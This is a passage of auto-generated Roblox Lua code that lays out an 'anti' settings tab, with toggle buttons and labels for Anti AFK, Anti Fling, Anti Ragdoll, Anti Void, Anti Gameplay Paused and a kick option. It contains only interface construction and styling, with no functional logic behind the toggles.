-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text
G2L["ef"] = Instance.new("TextLabel", G2L["e8"]);
G2L["ef"]["TextWrapped"] = true;
G2L["ef"]["ZIndex"] = 10;
G2L["ef"]["BorderSizePixel"] = 0;
G2L["ef"]["TextSize"] = 14;
G2L["ef"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["BackgroundTransparency"] = 1;
G2L["ef"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["Text"] = [[Anti AFK]];
G2L["ef"]["Name"] = [[text]];
G2L["ef"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.UIPadding
G2L["f0"] = Instance.new("UIPadding", G2L["ef"]);
G2L["f0"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.text
G2L["f1"] = Instance.new("UIStroke", G2L["ef"]);
G2L["f1"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.UIPadding
G2L["f2"] = Instance.new("UIPadding", G2L["e8"]);
G2L["f2"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling
G2L["f3"] = Instance.new("Frame", G2L["e1"]);
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["f3"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Name"] = [[fling]];
G2L["f3"]["LayoutOrder"] = 2;
G2L["f3"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button
G2L["f4"] = Instance.new("TextButton", G2L["f3"]);
G2L["f4"]["BorderSizePixel"] = 0;
G2L["f4"]["TextTransparency"] = 1;
G2L["f4"]["TextSize"] = 14;
G2L["f4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f4"]["ZIndex"] = 50;
G2L["f4"]["BackgroundTransparency"] = 1;
G2L["f4"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f4"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.UIPadding
G2L["f5"] = Instance.new("UIPadding", G2L["f4"]);
G2L["f5"]["PaddingTop"] = UDim.new(0, 3);
G2L["f5"]["PaddingRight"] = UDim.new(0, 3);
G2L["f5"]["PaddingLeft"] = UDim.new(0, 3);
G2L["f5"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame
G2L["f6"] = Instance.new("Frame", G2L["f4"]);
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["f6"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["f6"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["f6"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.outlineStroke
G2L["f7"] = Instance.new("UIStroke", G2L["f6"]);
G2L["f7"]["Thickness"] = 2;
G2L["f7"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade
G2L["f8"] = Instance.new("CanvasGroup", G2L["f6"]);
G2L["f8"]["BorderSizePixel"] = 0;
G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f8"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f8"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.toggleFrame.toggleFade.UIGradient
G2L["f9"] = Instance.new("UIGradient", G2L["f8"]);
G2L["f9"]["Rotation"] = 90;
G2L["f9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text
G2L["fa"] = Instance.new("TextLabel", G2L["f3"]);
G2L["fa"]["TextWrapped"] = true;
G2L["fa"]["ZIndex"] = 10;
G2L["fa"]["BorderSizePixel"] = 0;
G2L["fa"]["TextSize"] = 14;
G2L["fa"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fa"]["BackgroundTransparency"] = 1;
G2L["fa"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fa"]["Text"] = [[Anti Fling]];
G2L["fa"]["Name"] = [[text]];
G2L["fa"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.UIPadding
G2L["fb"] = Instance.new("UIPadding", G2L["fa"]);
G2L["fb"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.text.text
G2L["fc"] = Instance.new("UIStroke", G2L["fa"]);
G2L["fc"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.UIPadding
G2L["fd"] = Instance.new("UIPadding", G2L["f3"]);
G2L["fd"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll
G2L["fe"] = Instance.new("Frame", G2L["e1"]);
G2L["fe"]["BorderSizePixel"] = 0;
G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fe"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["fe"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["fe"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fe"]["Name"] = [[ragdoll]];
G2L["fe"]["LayoutOrder"] = 4;
G2L["fe"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button
G2L["ff"] = Instance.new("TextButton", G2L["fe"]);
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["TextTransparency"] = 1;
G2L["ff"]["TextSize"] = 14;
G2L["ff"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ff"]["ZIndex"] = 50;
G2L["ff"]["BackgroundTransparency"] = 1;
G2L["ff"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.UIPadding
G2L["100"] = Instance.new("UIPadding", G2L["ff"]);
G2L["100"]["PaddingTop"] = UDim.new(0, 3);
G2L["100"]["PaddingRight"] = UDim.new(0, 3);
G2L["100"]["PaddingLeft"] = UDim.new(0, 3);
G2L["100"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame
G2L["101"] = Instance.new("Frame", G2L["ff"]);
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["101"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["101"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["101"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["101"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.outlineStroke
G2L["102"] = Instance.new("UIStroke", G2L["101"]);
G2L["102"]["Thickness"] = 2;
G2L["102"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade
G2L["103"] = Instance.new("CanvasGroup", G2L["101"]);
G2L["103"]["BorderSizePixel"] = 0;
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["103"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.button.toggleFrame.toggleFade.UIGradient
G2L["104"] = Instance.new("UIGradient", G2L["103"]);
G2L["104"]["Rotation"] = 90;
G2L["104"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text
G2L["105"] = Instance.new("TextLabel", G2L["fe"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["ZIndex"] = 10;
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextSize"] = 14;
G2L["105"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["BackgroundTransparency"] = 1;
G2L["105"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[Anti Ragdoll]];
G2L["105"]["Name"] = [[text]];
G2L["105"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.UIPadding
G2L["106"] = Instance.new("UIPadding", G2L["105"]);
G2L["106"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.text.text
G2L["107"] = Instance.new("UIStroke", G2L["105"]);
G2L["107"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.ragdoll.UIPadding
G2L["108"] = Instance.new("UIPadding", G2L["fe"]);
G2L["108"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void
G2L["109"] = Instance.new("Frame", G2L["e1"]);
G2L["109"]["BorderSizePixel"] = 0;
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["109"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["109"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["109"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["Name"] = [[void]];
G2L["109"]["LayoutOrder"] = 2;
G2L["109"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button
G2L["10a"] = Instance.new("TextButton", G2L["109"]);
G2L["10a"]["BorderSizePixel"] = 0;
G2L["10a"]["TextTransparency"] = 1;
G2L["10a"]["TextSize"] = 14;
G2L["10a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10a"]["ZIndex"] = 50;
G2L["10a"]["BackgroundTransparency"] = 1;
G2L["10a"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["10a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10a"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.UIPadding
G2L["10b"] = Instance.new("UIPadding", G2L["10a"]);
G2L["10b"]["PaddingTop"] = UDim.new(0, 3);
G2L["10b"]["PaddingRight"] = UDim.new(0, 3);
G2L["10b"]["PaddingLeft"] = UDim.new(0, 3);
G2L["10b"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame
G2L["10c"] = Instance.new("Frame", G2L["10a"]);
G2L["10c"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["10c"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["10c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10c"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["10c"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.outlineStroke
G2L["10d"] = Instance.new("UIStroke", G2L["10c"]);
G2L["10d"]["Thickness"] = 2;
G2L["10d"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade
G2L["10e"] = Instance.new("CanvasGroup", G2L["10c"]);
G2L["10e"]["BorderSizePixel"] = 0;
G2L["10e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10e"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.button.toggleFrame.toggleFade.UIGradient
G2L["10f"] = Instance.new("UIGradient", G2L["10e"]);
G2L["10f"]["Rotation"] = 90;
G2L["10f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text
G2L["110"] = Instance.new("TextLabel", G2L["109"]);
G2L["110"]["TextWrapped"] = true;
G2L["110"]["ZIndex"] = 10;
G2L["110"]["BorderSizePixel"] = 0;
G2L["110"]["TextSize"] = 14;
G2L["110"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["110"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["110"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["110"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["110"]["BackgroundTransparency"] = 1;
G2L["110"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["110"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["110"]["Text"] = [[Anti Void]];
G2L["110"]["Name"] = [[text]];
G2L["110"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.UIPadding
G2L["111"] = Instance.new("UIPadding", G2L["110"]);
G2L["111"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.text.text
G2L["112"] = Instance.new("UIStroke", G2L["110"]);
G2L["112"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.void.UIPadding
G2L["113"] = Instance.new("UIPadding", G2L["109"]);
G2L["113"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused
G2L["114"] = Instance.new("Frame", G2L["e1"]);
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["114"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["114"]["Name"] = [[gameplaypaused]];
G2L["114"]["LayoutOrder"] = 2;
G2L["114"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button
G2L["115"] = Instance.new("TextButton", G2L["114"]);
G2L["115"]["BorderSizePixel"] = 0;
G2L["115"]["TextTransparency"] = 1;
G2L["115"]["TextSize"] = 14;
G2L["115"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["115"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["115"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["115"]["ZIndex"] = 50;
G2L["115"]["BackgroundTransparency"] = 1;
G2L["115"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["115"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["115"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame
G2L["116"] = Instance.new("Frame", G2L["115"]);
G2L["116"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["116"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["116"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["116"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["116"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade
G2L["117"] = Instance.new("CanvasGroup", G2L["116"]);
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.toggleFade.UIGradient
G2L["118"] = Instance.new("UIGradient", G2L["117"]);
G2L["118"]["Rotation"] = 90;
G2L["118"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.toggleFrame.outlineStroke
G2L["119"] = Instance.new("UIStroke", G2L["116"]);
G2L["119"]["Thickness"] = 2;
G2L["119"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.button.UIPadding
G2L["11a"] = Instance.new("UIPadding", G2L["115"]);
G2L["11a"]["PaddingTop"] = UDim.new(0, 3);
G2L["11a"]["PaddingRight"] = UDim.new(0, 3);
G2L["11a"]["PaddingLeft"] = UDim.new(0, 3);
G2L["11a"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text
G2L["11b"] = Instance.new("TextLabel", G2L["114"]);
G2L["11b"]["TextWrapped"] = true;
G2L["11b"]["ZIndex"] = 10;
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["TextSize"] = 14;
G2L["11b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["BackgroundTransparency"] = 1;
G2L["11b"]["Size"] = UDim2.new(0, 155, 0, 20);
G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11b"]["Text"] = [[Anti Gameplay Paused]];
G2L["11b"]["Name"] = [[text]];
G2L["11b"]["Position"] = UDim2.new(0.10227, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.UIPadding
G2L["11c"] = Instance.new("UIPadding", G2L["11b"]);
G2L["11c"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.text.text
G2L["11d"] = Instance.new("UIStroke", G2L["11b"]);
G2L["11d"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.gameplaypaused.UIPadding
G2L["11e"] = Instance.new("UIPadding", G2L["114"]);
G2L["11e"]["PaddingLeft"] = UDim.new(0, 2);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---
G2L["11f"] = Instance.new("Frame", G2L["e1"]);
G2L["11f"]["BorderSizePixel"] = 0;
G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11f"]["Size"] = UDim2.new(1, 0, 0, 10);
G2L["11f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["11f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11f"]["Name"] = [[---DIVIDER---]];
G2L["11f"]["LayoutOrder"] = 3;
G2L["11f"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame
G2L["120"] = Instance.new("Frame", G2L["11f"]);
G2L["120"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["120"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["120"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["120"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["120"]["Name"] = [[dividerFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
G2L["121"] = Instance.new("CanvasGroup", G2L["120"]);
G2L["121"]["BorderSizePixel"] = 0;
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
G2L["122"] = Instance.new("UIGradient", G2L["121"]);
G2L["122"]["Rotation"] = 90;
G2L["122"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
G2L["123"] = Instance.new("UIStroke", G2L["120"]);
G2L["123"]["Thickness"] = 2;
G2L["123"]["Name"] = [[outlineStroke]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
G2L["124"] = Instance.new("UIStroke", G2L["120"]);
G2L["124"]["Color"] = Color3.fromRGB(51, 51, 51);
G2L["124"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
G2L["125"] = Instance.new("UICorner", G2L["120"]);



-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.---DIVIDER---.UIPadding
G2L["126"] = Instance.new("UIPadding", G2L["11f"]);
G2L["126"]["PaddingTop"] = UDim.new(0, 3);
G2L["126"]["PaddingRight"] = UDim.new(0, 8);
G2L["126"]["PaddingLeft"] = UDim.new(0, 8);
G2L["126"]["PaddingBottom"] = UDim.new(0, 3);


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick
G2L["127"] = Instance.new("Frame", G2L["e1"]);
G2L["127"]["BorderSizePixel"] = 0;
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["127"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["Name"] = [[kick]];
G2L["127"]["LayoutOrder"] = 2;
G2L["127"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button
G2L["128"] = Instance.new("TextButton", G2L["127"]);
G2L["128"]["BorderSizePixel"] = 0;
G2L["128"]["TextTransparency"] = 1;
G2L["128"]["TextSize"] = 14;
G2L["128"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["128"]["ZIndex"] = 50;
G2L["128"]["BackgroundTransparency"] = 1;
G2L["128"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame
G2L["129"] = Instance.new("Frame", G2L["128"]);
G2L["129"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["129"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["129"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["129"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["129"]["Name"] = [[toggleFrame]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade
G2L["12a"] = Instance.new("CanvasGroup", G2L["129"]);
G2L["12a"]["BorderSizePixel"] = 0;
G2L["12a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["12a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12a"]["Name"] = [[toggleFade]];


-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.kick.button.toggleFrame.toggleFade.UIGradient
G2L["12b"] = Instance.new("UIGradient", G2L["12a"]);
G2L["12b"]["Rotation"] = 90;
